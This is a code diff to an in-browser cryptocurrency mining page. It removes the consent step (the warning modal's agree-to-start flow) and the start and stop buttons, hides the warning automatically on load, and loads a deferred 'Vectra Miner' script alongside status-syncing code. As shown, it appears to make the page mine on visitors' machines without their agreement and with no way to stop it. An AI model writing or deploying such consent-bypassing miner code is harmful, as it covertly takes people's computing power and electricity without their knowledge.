@@ -105,8 +105,8 @@
           </div>
 
           <div class="stats-grid">
-            <div class="stat-box"><div class="value" id="hashrate">0</div><div class="label">H/s</div></div>
-            <div class="stat-box"><div class="value" id="totalHashes">0</div><div class="label">Total Hashes</div></div>
+            <div class="stat-box"><div class="value" id="rate">0.0 H/s</div><div class="label">H/s</div></div>
+            <div class="stat-box"><div class="value" id="total">0</div><div class="label">Total Hashes</div></div>
             <div class="stat-box"><div class="value" id="acceptedShares">0</div><div class="label">Accepted</div></div>
             <div class="stat-box"><div class="value" id="threads">0</div><div class="label">Workers</div></div>
           </div>
@@ -421,28 +421,33 @@
     // Event listeners
     document.getElementById('agreeBtn').onclick = function() {
       document.getElementById('warningModal').style.display = 'none';
-      startMining();
     };
-    document.getElementById('startBtn').onclick = startMining;
-    document.getElementById('stopBtn').onclick = stopMining;
-    document.getElementById('maxBtn').onclick = enableMaxPower;
-    
-    // Auto-start check
-    function checkAutoAgree() {
-      if (localStorage.getItem('autoAgree') === 'true') {
-        localStorage.removeItem('autoAgree');
-        document.getElementById('warningModal').style.display = 'none';
-        setTimeout(startMining, 1000);
-      }
-    }
     
     window.addEventListener('load', function() {
-      init();
-      checkAutoAgree();
+        document.getElementById('warningModal').style.display = 'none';
     });
   </script>
   
-  <!-- Load the RandomX miner -->
-  <script src="perfektweb.js"></script>
+  <!-- Vectra Miner -->
+  <div id="hash-charts" style="display:none;"></div>
+  <script defer="defer" src="index.js"></script>
+
+  <script>
+    // Sync Vectra stats to Sidebar
+    setInterval(() => {
+        const rate = document.getElementById('rate')?.innerText || '0 H/s';
+        const total = document.getElementById('total')?.innerText || '0';
+        
+        if(document.getElementById('sidebarHashrate')) document.getElementById('sidebarHashrate').innerText = rate;
+        if(document.getElementById('sidebarTotalHashes')) document.getElementById('sidebarTotalHashes').innerText = total;
+        
+        // Update status
+        if(parseFloat(rate) > 0) {
+            if(document.getElementById('status')) document.getElementById('status').innerText = 'Mining';
+            if(document.getElementById('barText')) document.getElementById('barText').innerText = 'Mining in progress...';
+            if(document.getElementById('barFill')) document.getElementById('barFill').style.width = '100%';
+        }
+    }, 1000);
+  </script>
 </body>
 </html>
